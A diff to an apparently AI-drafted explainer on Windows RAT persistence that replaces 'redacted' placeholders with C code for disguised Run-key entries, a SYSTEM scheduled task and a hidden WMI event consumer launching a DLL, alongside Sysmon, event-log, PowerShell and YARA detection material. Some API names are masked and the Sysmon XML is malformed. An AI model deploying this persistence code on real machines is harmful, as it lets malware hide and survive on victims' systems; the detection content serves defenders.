@@ -37,9 +37,28 @@ Let me provide a thorough academic-style document.
 
 The most ubiquitous persistence vector employed by Remote Access Trojans is the Windows Registry `Run` key. The following Win32 API sequence is characteristic:
 
-
-> *[Implementation code block redacted — 21 lines of c. Full unredacted data available to verified researchers upon request.]*
-
+```c
+HKEY hKey;
+LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+LSTATUS status = R**********xA(
+    HKEY_CURRENT_USER,      // HKCU — current user scope
+    lpSubKey,               // path to Run key
+    0,                      // reserved, must be 0
+    KEY_SET_VALUE,          // write access required
+    &hKey                   // out: handle to opened key
+);
+if (status == ERROR_SUCCESS) {
+    R**********xA(
+        hKey,
+        "WindowsUpdate",          // value name (masqueraded)
+        0,                        // reserved
+        REG_SZ,                   // string type
+        (const BYTE*)"C:\\Users\\victim\\AppData\\Roaming\\svchost.exe",
+        strlen(path) + 1
+    );
+    RegCloseKey(hKey);
+}
+```
 
 **Mechanism:** The `Run` key under `HKEY_CURRENT_USER` (HKCU) causes the specified executable to launch each time the user logs in. RAT authors frequently choose HKCU over HKLM to avoid requiring administrator privileges and UAC elevation. The value name is often disguised as a legitimate Windows component (e.g., `WindowsUpdate`, `JavaUpdater`, `AdobeFlashHelper`).
 
@@ -60,9 +79,41 @@ Modern RATs leverage the Windows Task Scheduler 2.0 API via the `ITaskService` C
 
 ### COM Initialization Sequence
 
+```c
+// 1. Initialize COM
+CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
-> *[Implementation code block redacted — 34 lines of c. Full unredacted data available to verified researchers upon request.]*
+// 2. Create TaskService instance
+ITaskService *pService = NULL;
+CoCreateInstance(
+    CLSID_TaskScheduler,       // {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
+    NULL,
+    CLSCTX_INPROC_SERVER,
+    IID_ITaskService,          // schedules tasks
+    (void**)&pService
+);
 
+// 3. Connect to local task scheduler
+pService->Connect(_variant_t(NULL), _variant_t(NULL),
+                  _variant_t(NULL), _variant_t(NULL));
+
+// 4. Get root task folder
+ITaskFolder *pRootFolder = NULL;
+pService->GetFolder(_bstr_t("\\"), &pRootFolder);
+
+// 5. Register the RAT binary as a scheduled task
+IRegisteredTask *pTask = NULL;
+pRootFolder->RegisterTaskDefinition(
+    _bstr_t("MicrosoftEdgeUpdateTask"),   // disguised name
+    pDefinition,                           // ITaskDefinition object
+    TASK_CREATE_OR_UPDATE,
+    _variant_t("SYSTEM"),                 // runs as SYSTEM
+    _variant_t(NULL),                     // no password
+    TASK_LOGON_SERVICE_ACCOUNT,
+    _bstr_t(""),                          // sddl (empty = default)
+    &pTask
+);
+```
 
 ### Trigger Configuration
 
@@ -81,15 +132,54 @@ Windows Management Instrumentation (WMI) EventFilter persistence is among the mo
 
 ### WMI Event Subscription Architecture
 
-
-> *[Implementation code block redacted — 13 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+WMI EventFilter  ──────── filters ────────► WMI EventConsumer
+       │                                            │
+       │                                     ┌──────┴──────┐
+       │                             ActiveScript   CommandLine
+       │                             Consumer        Consumer
+       ▼
+__EventFilter object         __EventConsumer object
+    (filter definition)          (action definition)
+                                        │
+                                        ▼
+                              __FilterToConsumerBinding
+                                    (link)
+```
 
 ### Implementation via COM (IWbemServices)
 
+```c
+IWbemServices *pSvc = NULL;
+// ... (connect to root\subscription namespace) ...
 
-> *[Implementation code block redacted — 30 lines of c. Full unredacted data available to verified researchers upon request.]*
+// Step 1: Create EventFilter
+IWbemClassObject *pFilter = NULL;
+pSvc->GetObject(L"__EventFilter", 0, NULL, &pFilter, NULL);
+pFilter->Put(L"QueryLanguage", 0, &_variant_t(L"WQL"), 0);
+pFilter->Put(L"Query", 0, &_variant_t(
+    L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
+    L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
+    L"AND TargetInstance.SystemUpTime >= 240"
+), 0);
+pFilter->Put(L"Name", 0, &_variant_t(L"SystemHealthMonitor"), 0);
+pFilter->Put(L"EventNamespace", 0, &_variant_t(L"root\\cimv2"), 0);
 
+// Step 2: Create CommandLineEventConsumer
+IWbemClassObject *pConsumer = NULL;
+pSvc->GetObject(L"CommandLineEventConsumer", 0, NULL, &pConsumer, NULL);
+pConsumer->Put(L"Name", 0, &_variant_t(L"SystemHealthConsumer"), 0);
+pConsumer->Put(L"CommandLineTemplate", 0,
+    &_variant_t(L"C:\\Windows\\system32\\rundll32.exe "
+                L"C:\\Users\\victim\\AppData\\Roaming\\syshelper.dll,#1"), 0);
+pConsumer->Put(L"ShowWindowCommand", 0, &_variant_t(0L), 0); // SW_HIDE
+
+// Step 3: Bind filter to consumer
+IWbemClassObject *pBinding = NULL;
+pSvc->GetObject(L"__FilterToConsumerBinding", 0, NULL, &pBinding, NULL);
+pBinding->Put(L"Filter", 0, &_variant_t(pFilter->GetObjectPath()), 0);
+pBinding->Put(L"Consumer", 0, &_variant_t(pConsumer->GetObjectPath()), 0);
+```
 
 **Trigger Conditions (WQL Queries) Commonly Used by RATs:**
 | WQL Query | Trigger Timing |
@@ -104,13 +194,17 @@ Windows Management Instrumentation (WMI) EventFilter persistence is among the mo
 
 ### 4.1 Registry Monitoring (Sysmon Event ID 13)
 
+`R**********xA` writes to `Run` keys generate Sysmon Event ID 13 (`RegistryEvent (Value Set)`). Detection rule:
 
-> *[Operational procedure redacted. Technical content identified: Windows registry persistence API. Full unredacted data available to verified researchers upon request.]*
-
-
-
-> *[Implementation code block redacted — 8 lines of xml. Full unredacted data available to verified researchers upon request.]*
-
+```xml
+<RuleGroup name="RAT Persistence Registry" groupRelation="or">
+  <RegistryEvent onmatch="include">
+    <TargetObject name="T1037.001">
+    condition="contains">CurrentVersion\Run</TargetObject>
+    <Image condition="contains">AppData\Roaming</Image>
+  </RegistryEvent>
+</RuleGroup>
+```
 
 ### 4.2 Task Scheduler Audit (Event ID 106 / 4698)
 
@@ -118,17 +212,25 @@ Windows Management Instrumentation (WMI) EventFilter persistence is among the mo
 - **TaskScheduler Operational 106**: `Task created.`
 
 Detection via EventLog filtering:
-
-> *[Implementation code block redacted — 2 lines of code. Full unredacted data available to verified researchers upon request.]*
-
+```
+Security: 4698 AND TaskName CONTAINS "MicrosoftEdgeUpdate" OR "JavaUpdate"
+```
 
 ### 4.3 WMI Subscription Detection
 
 WMI persistence is invisible to most file-based scanners. Detection requires querying the WMI repository:
 
+```powershell
+# PowerShell — enumerate all permanent event subscriptions
+Get-WMIObject -Namespace root\subscription -Class __EventFilter
+Get-WMIObject -Namespace root\subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
 
-> *[Implementation code block redacted — 10 lines of powershell. Full unredacted data available to verified researchers upon request.]*
-
+# Or using modern CIM cmdlets
+Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
+Get-CimInstance -Namespace root/subscription -ClassName __EventConsumer
+Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
+```
 
 **Indicators of Suspicious WMI Subscriptions:**
 - `CommandLineTemplate` containing encoded PowerShell, rundll32, or base64
@@ -146,9 +248,47 @@ Mark Russinovich's **Autoruns** is the gold-standard detection tool, enumerating
 
 ### 4.5 YARA Rule — RAT Persistence Indicators
 
+```
+rule rat_persistence_run_key {
+    meta:
+        description = "Detects R**********xA/R**********xA for Run key persistence"
+        mitre_id = "T1547.001"
+    strings:
+        $s1 = "CurrentVersion\\Run" nocase
+        $s2 = "R**********xA" nocase
+        $s3 = "R**********xA" nocase
+        $s4 = "KEY_SET_VALUE" nocase
+    condition:
+        all of ($s1,$s2,$s3,$s4)
+}
 
-> *[Implementation code block redacted — 40 lines of code. Full unredacted data available to verified researchers upon request.]*
+rule rat_persistence_task_svc {
+    meta:
+        description = "Detects ITaskService COM usage for scheduled task persistence"
+        mitre_id = "T1053.005"
+    strings:
+        $s1 = "ITaskService" nocase
+        $s2 = "TaskScheduler" nocase
+        $s3 = "RegisterTaskDefinition" nocase
+        $s4 = "TASK_TRIGGER_LOGON" nocase
+    condition:
+        2 of ($s1,$s2,$s3) or $s4
+}
 
+rule rat_persistence_wmi {
+    meta:
+        description = "Detects WMI EventFilter/Consumer for persistence"
+        mitre_id = "T1546.003"
+    strings:
+        $s1 = "__EventFilter" nocase
+        $s2 = "__EventConsumer" nocase
+        $s3 = "__FilterToConsumerBinding" nocase
+        $s4 = "CommandLineEventConsumer" nocase
+        $s5 = "ActiveScriptEventConsumer" nocase
+    condition:
+        any of ($s1,$s2,$s3) and any of ($s4,$s5)
+}
+```
 
 ---
 
@@ -176,9 +316,9 @@ Mark Russinovich's **Autoruns** is the gold-standard detection tool, enumerating
 
 RAT persistence operates along a spectrum of complexity:
 
-
-> *[Operational procedure redacted. Technical content identified: Windows registry persistence API. Full unredacted data available to verified researchers upon request.]*
-
+1. **Registry Run Keys** (T1547.001) — Simplest, most detected; uses `R**********xA` → `R**********xA`.
+2. **Task Scheduler** (T1053.005) — Moderate complexity; uses `ITaskService` COM to register XML-defined tasks with flexible triggers.
+3. **WMI Event Subscriptions** (T1546.003) — Most stealthy; lives entirely in the WMI repository; combines `__EventFilter`, `__EventConsumer`, and `__FilterToConsumerBinding`.
 
 Detection strategies must evolve from simple file/registry scanning to active WMI repository interrogation, event log correlation, and behavioral analysis of process creation chains.
 
